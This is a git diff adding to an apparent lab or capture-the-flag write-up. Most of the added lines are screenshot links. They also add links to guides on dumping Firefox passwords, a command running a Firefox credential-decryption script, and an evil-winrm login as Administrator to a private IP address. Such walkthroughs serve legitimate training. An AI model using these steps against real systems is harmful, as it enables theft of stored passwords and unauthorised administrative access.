@@ -48,4 +48,28 @@ queryuser mikhail.larionov
 
 ![image](https://github.com/stensil4rt/CodeBy/assets/62753044/76dc000f-ffd7-4aa5-a091-5845705994d5)
 
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/5ce878b8-3221-424b-b937-6745f61ee129)
+
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/5b6ecc0f-1c65-40f7-a1d4-69f80e871f9c)
+
+https://medium.com/@s12deff/dump-firefox-passwords-with-firepwd-and-firefox-decrypt-65350fd74503
+
+https://medium.com/geekculture/how-to-hack-firefox-passwords-with-python-a394abf18016
+
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/921bab48-b214-40ca-9ca9-3166e5a5e4d4)
+
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/62bb7df3-508b-4470-aad5-6cf5c9c33f33)
+
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/cccd88c8-744c-439f-977f-7a53ec649c9e)
+
+```
+python firefox.py --non-fatal-decryption
+```
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/83d73201-dbe6-4c2a-ad9b-5eb60cad4061)
+```
+evil-winrm -i 192.168.2.11 -u 'Administrator' -p 'PASS'
+```
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/144b61ef-2580-44df-ba73-cb2c927ce32a)
+
+
 
